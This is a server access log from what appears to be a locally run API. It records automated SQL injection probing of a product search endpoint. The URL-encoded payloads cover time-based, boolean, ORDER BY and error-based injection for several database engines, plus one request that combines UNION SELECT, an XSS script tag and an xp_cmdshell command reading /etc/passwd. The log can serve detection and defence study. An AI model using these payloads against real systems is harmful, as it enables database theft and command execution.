api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:53188 - "GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53204 - "GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53206 - "GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53212 - "GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53226 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2870%29%7C%7CCHR%28118%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53230 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2870%29%7C%7CCHR%28118%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53236 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2870%29%7C%7CCHR%28118%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53252 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2870%29%7C%7CCHR%28118%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53276 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7009%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FnJH%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27auLk%27%3D%27auLk HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53282 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7009%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FnJH%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27DkGz%27%3D%27DkGz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53260 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7009%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FnJH%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288814%3D8814 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53290 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7009%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FnJH%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53298 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7009%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29FnJH%29--%2F%2A%2A%2FPbjt HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53306 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7908%3D%28SELECT%2F%2A%2A%2F7908%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27mIZl%27%3D%27mIZl HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53322 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7908%3D%28SELECT%2F%2A%2A%2F7908%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27GkrW%27%3D%27GkrW HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53336 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7908%3D%28SELECT%2F%2A%2A%2F7908%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284743%3D4743 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53308 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7908%3D%28SELECT%2F%2A%2A%2F7908%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53348 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7908%3D%28SELECT%2F%2A%2A%2F7908%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FdnJv HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53362 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SgpQ%27%3D%27SgpQ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53366 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27epGr%27%3D%27epGr HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53382 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%285693%3D5693 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53396 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53402 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FPgPV HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53416 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2434%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2879%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27tFBu%27%3D%27tFBu HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53400 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2434%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2879%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27eTpN%27%3D%27eTpN HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53430 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2434%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2879%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281117%3D1117 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53452 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2434%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2879%29%2C5%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53436 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2434%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2879%29%2C5%29--%2F%2A%2A%2FsxyK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53460 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FIDqQ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53468 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9177--%2F%2A%2A%2FlkFR HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53482 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FCwLr HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53490 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9295--%2F%2A%2A%2FMMuL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53512 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FoXmo HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53500 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5000--%2F%2A%2A%2FgdmM HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53522 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FCwUd HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53534 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1771--%2F%2A%2A%2FrxUH HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53548 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FvMKc HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53554 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2133--%2F%2A%2A%2FCAxK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53576 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53580 - "GET /produtos/busca/?categoria=teste&jhFJ=9814%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53592 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53602 - "GET /produtos/busca/?categoria=9724 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53606 - "GET /produtos/busca/?categoria=teste%22%28%29%27%2C.%29%2C.. HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53622 - "GET /produtos/busca/?categoria=teste%27eKnsYO%3C%27%22%3EoYbiBE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53634 - "GET /produtos/busca/?categoria=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53640 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3098%3D4106%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27VxUj%27%3D%27VxUj HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53644 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6065%3D5691%2F%2A%2A%2FAND%2F%2A%2A%2F%27SIbd%27%3D%27SIbd HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53650 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5287%3D7497%2F%2A%2A%2FAND%2F%2A%2A%2F%281937%3D1937 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53666 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9134%3D3961 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53670 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2892%3D9283--%2F%2A%2A%2FKJNB HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53686 - "GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284267%3D7563%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7563%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1557%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53696 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286920%2CCONCAT%280x5c%2C0x7162767a71%2C%28SELECT%2F%2A%2A%2F%28ELT%286920%3D6920%2C1%29%29%29%2C0x71717a7871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27gEHp%27%3D%27gEHp HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53702 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286920%2CCONCAT%280x5c%2C0x7162767a71%2C%28SELECT%2F%2A%2A%2F%28ELT%286920%3D6920%2C1%29%29%29%2C0x71717a7871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27AIEG%27%3D%27AIEG HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53710 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286920%2CCONCAT%280x5c%2C0x7162767a71%2C%28SELECT%2F%2A%2A%2F%28ELT%286920%3D6920%2C1%29%29%29%2C0x71717a7871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284759%3D4759 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53726 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286920%2CCONCAT%280x5c%2C0x7162767a71%2C%28SELECT%2F%2A%2A%2F%28ELT%286920%3D6920%2C1%29%29%29%2C0x71717a7871%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53736 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286920%2CCONCAT%280x5c%2C0x7162767a71%2C%28SELECT%2F%2A%2A%2F%28ELT%286920%3D6920%2C1%29%29%29%2C0x71717a7871%29%29--%2F%2A%2A%2Ftxla HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53740 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1417%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281417%3D1417%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27NqnU%27%3D%27NqnU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53742 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1417%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281417%3D1417%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27jaos%27%3D%27jaos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53758 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1417%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281417%3D1417%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287901%3D7901 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53768 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1417%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281417%3D1417%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53778 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1417%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281417%3D1417%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FPufb HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53788 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4572%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284572%3D4572%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27lDov%27%3D%27lDov HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53790 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4572%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284572%3D4572%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27rudX%27%3D%27rudX HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53804 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4572%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284572%3D4572%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285275%3D5275 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53820 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4572%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284572%3D4572%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53836 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4572%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284572%3D4572%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2Fzvdo HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53838 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9239%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289239%3D9239%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Thap%27%3D%27Thap HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53848 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9239%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289239%3D9239%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27tSPY%27%3D%27tSPY HTTP/1.1" 200 OK
